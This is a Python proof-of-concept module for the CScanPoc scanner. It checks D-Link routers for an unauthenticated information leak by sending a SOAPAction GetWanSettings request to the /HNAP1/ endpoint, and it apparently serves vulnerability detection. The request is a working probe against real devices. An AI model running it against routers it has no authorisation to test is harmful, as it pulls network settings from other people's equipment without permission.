# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'D-Link_0001'  # 平台漏洞编号，留空
    name = 'D-Link 未授权信息泄漏漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-04-21'  # 漏洞公布时间
    desc = '''
        D-link 未授权信息泄漏漏洞。
    '''  # 漏洞描述
    ref = 'http://www.freebuf.com/vuls/64521.html'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'Dlink'  # 漏洞应用名称
    product_version = '''
                        DIR-890L
                        DAP-1522 revB
                        DAP-1650 revB
                        DIR-880L
                        DIR-865L
                        DIR-860L revA
                        DIR-860L revB
                        DIR-815 revB
                        DIR-300 revB
                        DIR-600 revB
                        DIR-645
                        TEW-751DR
                        TEW-733GR'''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '0e29c46d-b9db-4349-a4b7-ce4366ddb3b6'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = '%s/HNAP1/' % self.target
            soap = {'SOAPAction': '"http://purenetworks.com/HNAP1/GetWanSettings"'}

            req = requests.get(verify_url, headers=soap)
            if req.status_code == 200 and 'xmlns:soap' in req.content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
